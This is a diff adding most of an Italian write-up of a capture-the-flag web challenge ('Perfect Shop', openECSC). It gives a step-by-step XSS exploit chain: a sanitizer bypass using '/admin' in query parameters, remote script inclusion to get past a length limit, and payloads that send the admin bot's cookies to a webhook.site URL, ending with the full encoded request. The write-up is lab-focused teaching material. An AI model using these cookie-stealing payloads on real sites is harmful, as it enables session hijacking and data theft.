@@ -297,7 +297,7 @@ La successione delle `actions` è la seguente:
 - Viene effettuata una GET a `http://${WEB_DOM}/product/${req.body.id}`, dove `WEB_DOM` è l'indirizzo del Perfect Shop, e `req.body.id` è l'id passato dall'utente durante il processo di report;
 - Non viene fatto nulla per un secondo.
 
-Una volta fatto questo, vengono gestiti vari casi d'errore e di successo. Verranno stampati due messaggi diversi in base al fatto se l'errore viene rilevato dal codice javascript del server della challenge, o se viene restituito uno [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) diverso da 200 dall'headless.
+Una volta fatto questo, vengono gestiti vari casi d'errore e di successo. Verranno stampati due messaggi diversi in base al fatto se l'errore viene rilevato dal codice JavaScript del server della challenge, o se viene restituito uno [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) diverso da 200 dall'headless.
 
 Quello che sta succedendo in breve è che il report dell'utente sta venendo verificato da un bot, che simulerà il comportamento di un admin loggato che presumibilmente ha dei cookie di sessione/autenticazione relativi allo Shop e che controllerà il prodotto con l'id indicato dall'utente nel momento del report.
 
@@ -416,7 +416,7 @@ A questo punto non resta che buildare e uppare la challenge, e vedere come va.
 Come ci si poteva aspettare, con i filtri disattivati ci si riesce a pwnare regolarmente. Ed a rubare un cookie?
 
 ##### Cookie stealing e webhooks
-I cookie sono un tipo di header speciale, e per questo esiste una sorta di shortcut in javascript che permette di accedervi, ovvero la proprietà `document.cookie`. 
+I cookie sono un tipo di header speciale, e per questo esiste una sorta di shortcut in JavaScript che permette di accedervi, ovvero la proprietà `document.cookie`. 
 
 Per riuscire ad esfiltrare i cookie di un utente sul sito, si ha bisogno di un endpoint che sia raggiungibile dalla vittima, il che significa che bisogna esporre un server per fare in modo che sia raggiungibile da chiunque. 
 
@@ -424,7 +424,7 @@ I [webhook](https://en.wikipedia.org/wiki/Webhook) sono... cose... molto versati
 
 Per fare una prova, si può utilizzare un payload di questo tipo. `<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>`
 
-In questo tipo di payload è importante non utilizzare un tag HTML, ma assicurarsi che stia venendo effettivamente eseguito del codice javascript (va bene inserire l'URL al webhook concatenato con `document.cookie` dentro ad un `onerror`, ma non in una semplice `src`) in modo che document.cookie sia "raggiungibile".
+In questo tipo di payload è importante non utilizzare un tag HTML, ma assicurarsi che stia venendo effettivamente eseguito del codice JavaScript (va bene inserire l'URL al webhook concatenato con `document.cookie` dentro ad un `onerror`, ma non in una semplice `src`) in modo che document.cookie sia "raggiungibile".
 
 Inoltre, bisogna appendere i cookie come query parameter (webhook e server personale) o come path (solo server personale). Non farlo significa appendere i cookie come parte dell'host, il che significa che la richiesta non raggiungerà mai la destinazione desiderata. Per esempio, invece di finire su `myhost.com`, finirebbe su `myhost.comCOOKIENAME=COOKIEVALUE`, che non ha senso, al contrario di `myhost.com?c=COOKIENAME=COOKIEVALUE` o `myhost.com/COOKIENAME=COOKIEVALUE` (che con `webhook,site` non ha senso, a meno che non si sia proprietari di suddetto dominio).
 
@@ -437,7 +437,7 @@ Ecco i cookies!
 #### Secondo passo: Cookie stealing al bot
 Forse avrebbe avuto più senso trovare prima un payload valido con il filtro di caratteri, ma in gara ero un po' nel panico e volevo essere sicuro di poter rubare i cookie al bot senza problemi. Paura immotivata, visto che non c'era alcun tipo di controllo in questo senso e non veniva specificato il valore di [`httpOnly`](https://owasp.org/www-community/HttpOnly) per il cookie `flag`, che verrà quindi settato come da default value a `false`.
 
-*che significa?* Per motivi di sicurezza è stata introdotta la flag opzionale `httpOnly` per il cookie, che se settata a `true` non permette al codice javascript presente nel documento di accedere a `document.cookie`, mitigando esattamente il tipo di attacco che sto per effettuare.
+*che significa?* Per motivi di sicurezza è stata introdotta la flag opzionale `httpOnly` per il cookie, che se settata a `true` non permette al codice JavaScript presente nel documento di accedere a `document.cookie`, mitigando esattamente il tipo di attacco che sto per effettuare.
 
 Ma prima, c'è da approfondire il funzionamento del bot e della relativa pagina di report.
 
@@ -472,3 +472,121 @@ Ovviamente io non sto URL-encodando il payload col solo scopo di far capire megl
 ![Esempio di prima ma URL-encodato](./media/vid/UrlEncoding4profit.gif)
 
 Prima una URL encodata per il valore del query parameter che il bot invierà all'endpoint di ricerca, e poi una URL-encodata per tutto il payload che sta per venire inviato al bot.
+
+Inviando questo payload, si riceve sul webhook una richiesta con la flag di prova settata nelle config:
+
+![Flag di prova inviata sul webhook](./media/img/FlagNoFilter.png)
+
+#### Terzo passo: Cookie stealing al bot con il sanitizer attivo
+Nella riga 16, si modifichi di nuovo il sanitizer in modo da settarlo come nell'applicazione originale, ribuildando il tutto:
+
+`app.use(sanitizer.clean({ xss: true }, ["/admin"]));`
+
+Una volta che l'applicazione verrà riuppata, si potrà notare che nessuno dei payload usati in precedenza funzionerà più, venendo sostituiti invece da una stringa vuota. 
+
+In questo passaggio ci sono ben pochi trick che si possono fare. Per risolvere questo "nodo", bisognava accorgersi dell'errore presente nella libreria del sanitizer, ed in gara è stato un passaggio tutt'altro che immediato. 
+
+Mettiamo caso che per qualsiasi motivo, che sia che avete provato ad inserire uno `/admin` nella richiesta come query parameter, o che con l'analisi statica vi siate accorti che c'era qualcosa che non andava nel sanitizer, adesso si sa che basta che `/admin` sia sottostringa dell'URL della richiesta (ricordo ancora una volta: i query parameter fanno parte dell'URL) per fare in modo che il sanitizer ignori qualsiasi tipo di payload XSS venga mandato.
+
+Una cosa molto comoda è che se si decide di inserire un query parameter non utilizzato dal server, questo viene inviato ad esso e semplicemente non viene utilizzato. Questo significa che è possibile mandare un parametro completamente aleatorio che abbia valore `/admin` per poter saltare qualsiasi tipo di sanitizzazione senza dover modificare il payload in qualche modo contorto.
+
+Quindi, se prima in fase di report si mandava `id=1/../../search?q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>&message=openECSC`, adesso si può mandare una cosa simile a `id=1/../../search?lol=/admin&q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>&message=/admin`. 
+
+Da notare come abbia dovuto usare uno `/admin` per bypassare il filtro durante la comunicazione col bot, e un altro per bypassare il filtro quando si inganna il bot nell'eseguire una ricerca nell'endpoint relativo. 
+
+Naturalmente, avviare una chain (?) del genere significa dover gestire correttamente l'URL encoding per fare in modo che i parametri vengano correttamente sparsi tra la POST che viene fatta all'endpoint di report (al quale verranno mandati i parametri `id` e `message`) e la richiesta che viene eseguita dal bot all'endpoint di ricerca (al quale verranno mandati il parametro necessario `search` e il dummy parameter `lol`).
+
+Una volta applicati gli URL encoding correttamente, il risultato dovrebbe essere questo: `id=1/../../search%3flol%3d"/admin"%26q%3d<script>window.location%253d"https%253a//webhook.site/[REDACTED]%253d"%252bdocument.cookie</script>&message=/admin`. 
+
+Non essendo escluso dal filtro, sarà necessario eludere il filtro anche nell'endpoint di report. Per farlo, basta aggiungere un query parameter qualunque col valore `/admin` o `'/admin'` anche nell'URL di report. In Burp Suite, il payload finale sarà:
+
+![Payload finale senza filtro di lunghezza](./media/img/PayloadNoLenght.png)
+
+Facendo questo, si dovrebbe di nuovo ottenere la flag sul webhook come prima. Ora c'è da superare l'ultimo ostacolo...
+
+#### Ultimo passo: filtro di lunghezza
+Questo passo non richiedeva una vera e propria scienza. Diciamo che mi sono limitato a cercare un payload più corto possibile con la stessa filosofia dei payload precedenti. Per completezza, aggiungo un sottocapitolo con le varie cose che ho provato.
+
+##### Cosa ho provato durante la gara
+- Prima di tutto ho provato più volte a sfruttare la [unicode normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html), con un payload del tipo [`<script src=//ﬀﬀ.pw>`](https://jlajara.gitlab.io/XSS_20_characters), ma mi era sembrato inutile in quanto non mi avrebbe permesso di esfiltrare il cookie (cosa assolutamente non vera, ci tornerò dopo) in quanto non sarei riuscito ad appendere il contenuto di `document.cookie`, visto che il solo utilizzo di src non mi avrebbe permesso di eseguire del codice JavaScript;
+
+- Ho provato a usare `onerror` così: `<img src/onerror=this.src='https://[IP]/'+document.cookie>`, andando però ancora oltre al limite consentito di 50 caratteri;
+
+- Ho trovato il modo di non specificare il protocollo, ottenendo `<img src/onerror=this.src='//[IP]/'+document.cookie>`. Ancora decisamente troppo.
+
+- Ho provato a cambiare tag, provando prima con lo script `<script>location='//[IP]/'+document.cookie` dove `location` è una shortcut per accedere a `window location`, ma mi sono accorto che il payload non avrebbe funzionato se non avessi chiuso il tag.
+
+- Ancora, stavolta con `<svg onload=location='//[IP]/'+document.cookie>`, ma con l'IP avrei comunque sfortato di pochi caratteri.
+
+A forza di provare e riprovare, convincendomi sempre di più di non star usando il giusto approccio, e guardando e riguardando i file della challenge, anche i template che reputavo completamente sicuri, il mio sguardo è andato sul CDN di Bootstrap commentato. 
+
+Quello che viene fatto col CDN, è includere del codice JavaScript presente su un server esterno nella pagina che la chiama. Per fare questo basta il riferimento a questo server e un tag `script`. Eureka.
+
+#### XSS RFI
+Penso di poterla chiamare una Remote File Inclusion?
+
+Alla fine la soluzione era scrivere il proprio payload su un file qualsiasi. Il payload può essere lungo quanto si vuole, l'importante è che il tag che includerà il codice JavaScript in esso contenuto sia inferiore ai 50 caratteri.
+
+A questo punto ho creato un file di nome `x.js` che cambiasse l'indirizzo della pagina in quello del mio server, ovvero:
+
+```js
+window.location = "https://webhook.site/[REDACTED]?c=" + document.cookie;
+```
+
+A questo punto, è bastato inviare al bot un payload che gli facesse cercare `<script src='//[IP]:[PORT]/'></script>` in modo che includesse il file sul mio server, lo eseguisse, e mi inviasse la flag cambiando appunto l'indirizzo della pagina da quello della challenge a quello del mio webhook con query parameter i cookie relativi al sito della challenge.
+
+#### Come esporre un proprio server al mondo
+Per esporre i propri file al resto dell'internet non c'è bisogno di possedere fisicamente un server. Il nostro PC può ricoprire questo ruolo senza troppi problemi. Basta avere Python per fare ciò che ho fatto io durante la gara, quindi credo che qualsiasi sistema operativo supporti Python, permetta anche di esporre un server come sto per mostrare:
+
+Prima di tutto, c'è da ottenere il proprio IP locale, che su Linux si può ottenere runnando su terminale il comando `ifconfig`:
+
+![Esempio di IP locale trovato con ifconfig](./media/img/ifconfig.png)
+
+È probabile che a voi apparirà un IP che inizia per `192.`, qui ho fatto la prova sulla [MAN](https://www.cloudflare.com/it-it/learning/network-layer/what-is-a-metropolitan-area-network/) della mia università.
+
+Dopodichè, per esporre il file contenente il payload alla rete locale, si può sfruttare il comando di Python `python3 -m http.server [PORT]`. In questo modo, viene uppato un semplice server HTTP che esporrà tutti i file presenti nella cartella e relative sottocartelle nella quale è stato lanciato il comando, il che significa che all'URL `http://[IP]:[PORT]/x.js`, se tutto è stato eseguito correttamente, si dovrebbe trovare il payload.
+
+![Esempio di server HTTP semplice](./media/img/SimpleHTTPserver.png)
+
+Aprendolo si dovrebbe poter vedere il payload, che però non sta venendo eseguito. Do not be afraid, quando questo verrà incluso nel tag script, verrà eseguito come necessario.
+
+Come tutti i bravi bambini sanno, è però il router a comunicare col fantastico mondo dell'internet, e non direttamente il nostro dispositivo, che si limita a ricevere ed inviare informazioni tramite il router.
+
+Per scoprire qual è il proprio IP secondo il mondo esterno, basta usare un servizio online come [whatismyip.com](https://www.whatismyip.com/). A questo punto abbiamo quasi tutto: si sa qual è l'indirizzo IP sul quale si troverà il file da includere nel tag script passato al bot (ovvero l'IP che si è appena trovato), e si sa qual è la porta del nostro dispositivo sulla quale i nostri file sono esposti (d'altronde, l'abbiamo scelta noi).
+
+Manca però un passaggio: il router è raggiungibile dal mondo esterno, ma il server hostato sul dispositivo è raggiungibile solo nella rete locale. In qualche modo c'è da dire al router che quando viene ricevuta una richiesta su una certa porta, quella richiesta deve essere gestita dal server Python.
+
+Il [port forwarding](https://en.wikipedia.org/wiki/Port_forwarding) permette di fare questo. Il procedimento per attivarlo cambia molto a seconda del fabbricatore del router.
+
+![Esempio di port forwarding](./media/img/PortForwarding.png)
+
+Mama mia Luigi!!!!! XDDDDDDDDDDDDDDDDDDDDD
+
+Come protocollo è importante selezionare TCP/UDP o simili se disponibili, altrimenti sarà meglio creare una port forwarding table per ogni protocollo.
+
+La porta WAN è la porta che sarà raggiungibile dall'esterno, mentre la porta LAN è la porta che riceverà i [pacchetti](https://en.wikipedia.org/wiki/Network_packet) dall'esterno. Per capirci, quella che è stata scelta quando è stato uppato il server HTTP in Python. Per evitare errori, consiglierei di usare la stessa porta LAN e WAN (interna e esterna) quando possibile.
+
+L'IP destinazione è l'IP locale del dispositivo utilizzato, ovvero quello che io ho ricavato con `ifconfig`, `ipconfig` in Windows.
+
+In questo modo, quando il router riceverà una richiesta sulla porta WAN selezionata, il pacchetto verrà reindirizzato all'IP locale e la porta che è stata inserita nella tabella di port forwarding. 
+
+Per provare che tutto sia stato fatto correttamente, basta visitare `[IP pubblico router]:[porta WAN]` da un dispositivo qualsiasi, ancora meglio se non collegato alla stessa rete locale del server sul quale si trova l'exploit (ad esempio un telefono con la connessione dati).
+
+### Final payload
+Let's do this.
+
+Ricapitolando: 
+
+- Il payload finalizzato per includere il codice JavaScript remoto è `<script src="//[IP]:[PORT]/x.js"></script>`.
+- Il codice presente su x.js è `window.location = "https://webhook.site/[REDACTED]?c=" + document.cookie;`.
+- Non rimane altro che mandare al bot un report di questo tipo:
+
+![Payload finale in Burp](./media/img/FinalBurp.png)
+
+`id=1/../../search%3flol%3d"/admin"%26q%3d<script%2bsrc%253d"http%253a//10.10.201.233%253a1337/x.js"></script>&message=/admin`, che si URL-decoda in `id=1/../../search?lol="/admin"&q=<script src="http://10.10.201.233:1337/x.js"></script>&message=/admin`
+
+Chiunque sia riuscito nell'impresa di arrivare a leggere fino a qui, grazie di cuore ❤️
+
+Per qualsiasi feedback, mi potete contattare su Discord: `titto_caru`
+
+![Letteralmente io](https://i.pinimg.com/474x/ca/fa/f8/cafaf8eedcafcfc74fd571d4763e96c7.jpg)
